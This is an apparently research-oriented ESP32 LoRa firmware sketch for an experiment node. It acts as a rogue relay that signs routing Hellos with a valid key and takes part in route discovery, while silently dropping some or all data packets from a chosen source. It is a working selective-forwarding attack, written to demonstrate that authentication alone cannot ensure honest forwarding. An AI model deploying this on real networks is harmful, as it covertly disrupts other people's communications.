// E11 — Node C: ROGUE RELAY (selective forwarder)
//
// Behaves as a legitimate relay in all observable ways:
//   - Holds valid PSK, signs Hellos correctly
//   - Participates in route discovery
//   - Passes HMAC checks on all received messages
//
// Hidden behavior: drops data packets from TARGET_SRC (0xAA).
// Packets from other sources are forwarded normally.
//
// DROP_RATE controls the fraction of target packets dropped:
//   DROP_RATE=100 → 100% drop (full selective forwarding)
//   DROP_RATE=50  → 50% drop (intermittent, harder to detect)
//
// Board: Ebyte EoRa PI (ESP32-S3FH4R2)  FQBN: esp32:esp32:esp32s3:CDCOnBoot=cdc

#define SECURITY_MODE  1
#define NODE_ID        0x22    // rogue relay occupies R2 position
#define GATEWAY_ID     0xBB
#define TARGET_SRC     0xAA    // drop packets from this source
#define DROP_RATE      100     // percent of target packets to drop (0–100)
#define DATA_PERIOD_MS  7500
#define RELAY_DELAY_MS   500

#include "../e11_common.h"
#include <Wire.h>
#include "SSD1306Wire.h"

SSD1306Wire oled(0x3c, 18, 17);

SPIClass spi(FSPI);
Module*  mod   = nullptr;
SX1262*  radio = nullptr;

volatile bool rxFlag = false;
void IRAM_ATTR onDio1() { rxFlag = true; }

uint8_t  best_nh     = GATEWAY_ID;
uint8_t  best_metric = 255;
uint32_t last_update = 0;

uint16_t hello_seq   = 0;
uint32_t fwd_count   = 0;
uint32_t drop_count  = 0;
uint32_t pkt_counter = 0;   // for DROP_RATE modulo
uint32_t last_hello  = 0;
uint32_t last_oled   = 0;

void oled_draw() {
  oled.clear();
  oled.setFont(ArialMT_Plain_10);
  oled.setTextAlignment(TEXT_ALIGN_LEFT);
  oled.drawString(0,  0, "NODE C  ROGUE RELAY");
  char buf[32];
  snprintf(buf, sizeof(buf), "FWD=%lu DROP=%lu", fwd_count, drop_count);
  oled.drawString(0, 14, buf);
  snprintf(buf, sizeof(buf), "target=0x%02X rate=%d%%", TARGET_SRC, DROP_RATE);
  oled.drawString(0, 28, buf);
  oled.drawString(0, 42, "HMAC valid: hidden!");
  oled.display();
}

void send_hello() {
  HelloMsg h = {};
  h.type   = MSG_HELLO;
  h.src    = NODE_ID;
  h.dst_gw = GATEWAY_ID;
  h.metric = best_metric < 255 ? best_metric : 2;
  h.seq    = hello_seq++;
  sign_hello(&h);
  radio->transmit((uint8_t*)&h, sizeof(h));
  radio->startReceive();
  Serial.printf("[ROGUE] Hello sent metric=%u — appears as legitimate relay\n", h.metric);
}

bool should_drop() {
  if (DROP_RATE >= 100) return true;
  if (DROP_RATE <= 0)   return false;
  return (pkt_counter % 100) < (uint32_t)DROP_RATE;
}

void setup() {
  Serial.begin(115200);
  delay(500);
  Serial.println("\n=== E11 Node C (ROGUE RELAY — selective forwarder) ===");
  Serial.printf("[INFO] Target: src=0x%02X  Drop rate: %d%%\n", TARGET_SRC, DROP_RATE);
  Serial.println("[INFO] HMAC-signed Hellos — indistinguishable from honest relay.");
  Serial.println("[INFO] Finding: authentication cannot enforce forwarding accountability.");

  Wire.begin(18, 17);
  oled.init(); oled.flipScreenVertically();
  oled_draw();

  eora_radio_init();
  spi.begin(LORA_SCK, LORA_MISO, LORA_MOSI, LORA_NSS);
  mod   = new Module(LORA_NSS, LORA_DIO1, LORA_RST, LORA_BUSY, spi);
  radio = new SX1262(mod);
  int st = radio->begin(LORA_FREQ, LORA_BW, LORA_SF, LORA_CR,
                        LORA_SYNC, LORA_POWER, 8, LORA_TCXO);
  if (st != RADIOLIB_ERR_NONE) {
    Serial.printf("[ERR] Radio init: %d\n", st); while (true) delay(1000);
  }
  radio->setDio1Action(onDio1);
  radio->startReceive();
  Serial.println("[RADIO] SX1262 ready @ 923 MHz AS923");
}

void loop() {
  uint32_t now = millis();
  if (now - last_hello >= DATA_PERIOD_MS && best_metric < 255)
    { last_hello = now; send_hello(); }
  if (now - last_oled >= 5000)
    { last_oled = now; oled_draw(); }

  if (rxFlag) {
    rxFlag = false;
    uint8_t buf[256];
    size_t  pkt_len = radio->getPacketLength();
    int     state   = radio->readData(buf, sizeof(buf));
    radio->startReceive();
    if (state != RADIOLIB_ERR_NONE || pkt_len == 0) return;

    if (buf[0] == MSG_HELLO && pkt_len >= sizeof(HelloMsg)) {
      HelloMsg *h = (HelloMsg*)buf;
      if (h->src == NODE_ID) return;
      if (!check_hello(h)) return;
      uint8_t cand = h->metric + 1;
      if (cand < best_metric || now - last_update > 30000) {
        best_nh = h->src; best_metric = cand; last_update = now;
        Serial.printf("[ROUTE] NH=0x%02X metric=%u\n", best_nh, best_metric);
      }
      // Re-broadcast Hello as legitimate relay
      HelloMsg relay = {};
      relay.type   = MSG_HELLO;
      relay.src    = NODE_ID;
      relay.dst_gw = GATEWAY_ID;
      relay.metric = cand;
      relay.seq    = hello_seq++;
      sign_hello(&relay);
      delay(RELAY_DELAY_MS);
      radio->transmit((uint8_t*)&relay, sizeof(relay));
      radio->startReceive();

    } else if (buf[0] == MSG_DATA && pkt_len >= sizeof(DataMsg)) {
      DataMsg *d = (DataMsg*)buf;
      if (d->dst != NODE_ID) return;
      if (!check_data(d)) return;

      pkt_counter++;
      if (d->src == TARGET_SRC && should_drop()) {
        // Selective drop — silent, no reply
        drop_count++;
        Serial.printf("[ROGUE] SILENT DROP src=0x%02X pkt_id=%u (drops=%lu rate=%d%%)\n",
                      d->src, d->pkt_id, drop_count, DROP_RATE);
        oled_draw();
        return;
      }

      // Forward normally
      DataMsg fwd = *d;
      fwd.dst = best_nh;
      sign_data(&fwd);
      radio->transmit((uint8_t*)&fwd, sizeof(fwd));
      radio->startReceive();
      fwd_count++;
      Serial.printf("[FWD] DATA src=0x%02X pkt_id=%u → 0x%02X\n",
                    fwd.src, fwd.pkt_id, fwd.dst);
    }
  }
}
